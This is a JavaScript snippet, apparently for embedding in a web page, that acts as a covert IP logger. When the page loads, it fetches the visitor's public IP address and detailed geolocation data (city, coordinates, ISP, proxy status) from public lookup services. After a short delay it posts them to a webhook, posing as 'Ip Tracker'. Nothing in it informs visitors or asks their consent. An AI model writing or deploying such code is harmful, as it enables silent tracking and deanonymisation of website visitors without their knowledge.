 function get_information(link, callback) {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", link, true);
        xhr.onreadystatechange = function() {
          if (xhr.readyState === 4) {
            callback(xhr.responseText);
          }
        };
        xhr.send(null);
      }
      get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
        var div = document.createElement("div");
        div.innerHTML = text;
        div.id = "razzylog";
        const secondList = document.getElementsByClassName("header")[0]
        secondList.appendChild(div)
      });
      get_information("https://api.ipify.org/", function(text) {
        var div = document.createElement("div");
        div.innerHTML = text;
        div.id = "ipppp";
        const secondList = document.getElementsByClassName("header")[0]
        secondList.appendChild(div)
      });

      function ipLogByRaz() {
        var ispp = document.getElementById('ipppp').innerHTML
        var extra = document.getElementById("razzylog").innerHTML
        const request = new XMLHttpRequest();
        request.open("POST", wbhk);
        request.setRequestHeader('Content-type', 'application/json');
        const params = {
          username: "Ip Tracker",
          avatar_url: 'https://cdn-icons-png.freepik.com/512/6434/6434897.png',
          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
        }
        request.send(JSON.stringify(params));
      }
      setTimeout(function() {
        ipLogByRaz()
      }, 700);